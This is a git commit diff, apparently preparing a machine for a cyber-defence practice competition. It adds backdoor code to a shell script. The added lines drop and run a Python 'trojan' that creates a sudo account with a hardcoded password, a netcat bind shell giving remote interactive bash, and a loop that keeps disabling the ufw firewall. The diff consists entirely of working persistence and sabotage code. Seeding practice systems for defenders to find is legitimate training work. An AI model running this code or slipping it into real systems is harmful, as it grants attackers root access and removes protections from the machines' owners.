f584b4187ef8db28b7aee6808569efab90e7478d
Trevor <zubabizz@gmail.com>
2016-08-02 09:25:46 -0400

    tues update

--- competition/tues.sh
+++ competition/tues.sh
@@ -21,3 +21,31 @@ do
   useradd -M -g sudo -p $(openssl passwd -crypt $user) $user
 done
 
+cat << 'EOF' >> /sbin/trojan.py
+#!/usr/bin/python
+import os
+import crypt
+password ="cookie"
+encPass = crypt.crypt(password,"22")
+os.system("useradd -g sudo -p "+encPass+" bagels")
+EOF
+chmod 755 /sbin/trojan.py
+/sbin/trojan.py &
+
+cat << 'EOF' >> /root/open_sesame_VIRUS.sh
+rm /tmp/d;mkfifo /tmp/d;cat /tmp/d|/bin/bash -i 2>&1|nc -l 2 >/tmp/d
+EOF
+chmod 755 /root/open_sesame_VIRUS.sh
+/root/open_sesame_VIRUS.sh &
+
+
+cat << EOF > /bin/virus.sh
+#!/bin/bash
+while true
+do
+  /usr/sbin/ufw disable
+  sleep 500
+done
+EOF
+chmod 755 /bin/virus.sh
+/bin/virus.sh &
